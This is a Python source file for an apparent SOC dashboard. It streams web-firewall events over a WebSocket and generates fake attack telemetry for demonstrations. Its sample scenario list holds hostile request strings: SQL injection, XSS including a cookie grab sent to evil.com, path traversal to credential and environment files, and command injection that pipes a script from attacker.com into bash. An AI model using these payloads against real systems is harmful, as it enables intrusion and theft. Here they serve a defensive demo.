"""
SentinelX — Real-Time WebSocket & Attack Traffic Simulator
Provides live streaming of intercepted threats to the SOC Dashboard,
plus an integrated traffic simulator for live demonstrations.
"""

import asyncio
import json
import logging
import random
import uuid
from datetime import datetime, timezone
from typing import Any

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

logger = logging.getLogger(__name__)
router = APIRouter()


class WebSocketConnectionManager:
    """Manages active SOC dashboard WebSocket connections."""

    def __init__(self):
        self.active_connections: list[WebSocket] = []
        self._lock = asyncio.Lock()

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        async with self._lock:
            self.active_connections.append(websocket)
        logger.info(f"SOC Dashboard connected to live stream (active: {len(self.active_connections)})")

    async def disconnect(self, websocket: WebSocket):
        async with self._lock:
            if websocket in self.active_connections:
                self.active_connections.remove(websocket)
        logger.info(f"SOC Dashboard disconnected (active: {len(self.active_connections)})")

    async def broadcast(self, message: dict[str, Any]):
        """Broadcast an event to all connected dashboard clients."""
        async with self._lock:
            dead_connections = []
            for connection in self.active_connections:
                try:
                    await connection.send_json(message)
                except Exception:
                    dead_connections.append(connection)

            for dead in dead_connections:
                if dead in self.active_connections:
                    self.active_connections.remove(dead)


manager = WebSocketConnectionManager()


# ──── Live WebSocket Endpoint ────

@router.websocket("/ws/attack-stream")
async def attack_stream_ws(websocket: WebSocket):
    """
    WebSocket channel for live attack events.
    Connected SOC dashboards receive instant push notifications for each detected threat.
    """
    await manager.connect(websocket)
    try:
        # Send an initial welcome / sync event
        await websocket.send_json({
            "type": "SYSTEM_CONNECTED",
            "message": "Connected to SentinelX Live SOC Stream",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })

        # Keep connection open and handle any incoming ping/pong from client
        while True:
            data = await websocket.receive_text()
            try:
                msg = json.loads(data)
                if msg.get("action") == "ping":
                    await websocket.send_json({"type": "pong", "timestamp": datetime.now(timezone.utc).isoformat()})
            except Exception:
                pass
    except WebSocketDisconnect:
        await manager.disconnect(websocket)
    except Exception as exc:
        logger.debug(f"WebSocket closed with exception: {exc}")
        await manager.disconnect(websocket)


# ──── Attack Traffic Simulator ────

SAMPLE_ATTACKERS = [
    {"ip": "185.220.101.5", "country": "DE"},
    {"ip": "45.154.255.89", "country": "RU"},
    {"ip": "103.203.57.18", "country": "CN"},
    {"ip": "177.54.148.12", "country": "BR"},
    {"ip": "103.251.167.20", "country": "IN"},
    {"ip": "194.26.29.112", "country": "NL"},
    {"ip": "198.51.100.45", "country": "US"},
    {"ip": "211.233.77.14", "country": "KR"},
    {"ip": "185.191.171.12", "country": "GB"},
    {"ip": "91.240.118.242", "country": "UA"},
]

ATTACK_SCENARIOS = [
    {
        "threat_type": "sqli",
        "severity": "critical",
        "action_taken": "blocked",
        "matched_rule_id": "SQLI-001",
        "paths": [
            "/api/v1/users?id=1%20UNION%20SELECT%20username,%20password%20FROM%20users--",
            "/api/v1/products?cat=electronics'%20OR%201=1--",
            "/api/v1/orders/lookup?ref=';%20DROP%20TABLE%20orders;--",
            "/api/v1/account/info?user=admin'%20AND%20SLEEP(5)--",
        ],
    },
    {
        "threat_type": "xss",
        "severity": "high",
        "action_taken": "blocked",
        "matched_rule_id": "XSS-001",
        "paths": [
            "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
            "/profile?bio=%3Cimg%20src=x%20onerror=fetch(%27http://evil.com/%27+document.cookie)%3E",
            "/comments/post?body=%3Csvg/onload=alert(1)%3E",
            "/redirect?url=javascript:alert(window.origin)",
        ],
    },
    {
        "threat_type": "path_traversal",
        "severity": "high",
        "action_taken": "blocked",
        "matched_rule_id": "TRAVERSAL-001",
        "paths": [
            "/api/v1/files/download?file=../../../../etc/passwd",
            "/assets/view?path=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
            "/config/read?target=../../.env",
            "/admin/logs?file=%252e%252e%252f%252e%252e%252fproc%2fself%2fenviron",
        ],
    },
    {
        "threat_type": "cmd_injection",
        "severity": "critical",
        "action_taken": "blocked",
        "matched_rule_id": "CMDI-001",
        "paths": [
            "/api/v1/network/ping?host=127.0.0.1;%20cat%20/etc/passwd",
            "/api/v1/tools/dns?domain=google.com%20|%20id",
            "/api/v1/system/status?node=$(whoami)",
            "/api/v1/backup/run?name=backup`curl%20http://attacker.com/rev.sh|bash`",
        ],
    },
    {
        "threat_type": "rate_limit",
        "severity": "medium",
        "action_taken": "blocked",
        "matched_rule_id": "RATE-LIMIT",
        "paths": [
            "/api/v1/auth/login",
            "/api/v1/password/reset",
            "/api/v1/graphql",
            "/api/v1/users/enumerate",
        ],
    },
]


class AttackSimulator:
    """Generates synthetic real-world attack telemetry in the background."""

    def __init__(self):
        self.running: bool = False
        self._task: asyncio.Task | None = None
        self.events_generated: int = 0

    def start(self, interval: float = 3.0):
        if not self.running:
            self.running = True
            self._task = asyncio.create_task(self._run_loop(interval))
            logger.info("Attack traffic simulator started.")

    def stop(self):
        if self.running:
            self.running = False
            if self._task:
                self._task.cancel()
                self._task = None
            logger.info("Attack traffic simulator stopped.")

    async def _run_loop(self, interval: float):
        while self.running:
            try:
                await asyncio.sleep(random.uniform(interval * 0.7, interval * 1.3))
                event = self.generate_event()
                self.events_generated += 1

                # Broadcast to connected WebSocket dashboards
                await manager.broadcast({
                    "type": "ATTACK_EVENT",
                    "data": event,
                })

                # Also optionally persist to database if available
                await self._persist_event(event)

            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.debug(f"Simulator error: {exc}")
                await asyncio.sleep(2)

    def generate_event(self) -> dict[str, Any]:
        scenario = random.choice(ATTACK_SCENARIOS)
        attacker = random.choice(SAMPLE_ATTACKERS)
        path = random.choice(scenario["paths"])

        return {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source_ip": attacker["ip"],
            "country_code": attacker["country"],
            "threat_type": scenario["threat_type"],
            "severity": scenario["severity"],
            "request_path": path,
            "action_taken": scenario["action_taken"],
            "matched_rule_id": scenario["matched_rule_id"],
        }

    async def _persist_event(self, event: dict[str, Any]):
        """Persist generated event to WAFLog database table."""
        try:
            from api.core.database import async_session_factory
            from api.models.waf_log import WAFLog

            async with async_session_factory() as session:
                log = WAFLog(
                    id=uuid.UUID(event["id"]),
                    source_ip=event["source_ip"],
                    country_code=event["country_code"],
                    request_method="GET",
                    request_path=event["request_path"],
                    matched_rule_id=event["matched_rule_id"],
                    threat_type=event["threat_type"],
                    severity=event["severity"],
                    action_taken=event["action_taken"],
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) SentinelX-Scanner/1.0",
                )
                session.add(log)
                await session.commit()
        except Exception:
            pass  # Non-blocking best effort


simulator = AttackSimulator()


# ──── Control Endpoints ────

@router.post("/simulator/start")
async def start_simulator(interval: float = 2.5):
    """Start the background attack traffic simulator."""
    simulator.start(interval)
    return {
        "status": "running",
        "interval_seconds": interval,
        "events_generated": simulator.events_generated,
    }


@router.post("/simulator/stop")
async def stop_simulator():
    """Stop the background attack traffic simulator."""
    simulator.stop()
    return {
        "status": "stopped",
        "events_generated": simulator.events_generated,
    }


@router.get("/simulator/status")
async def simulator_status():
    """Get the current state of the attack simulator."""
    return {
        "running": simulator.running,
        "events_generated": simulator.events_generated,
        "active_dashboard_subscribers": len(manager.active_connections),
    }
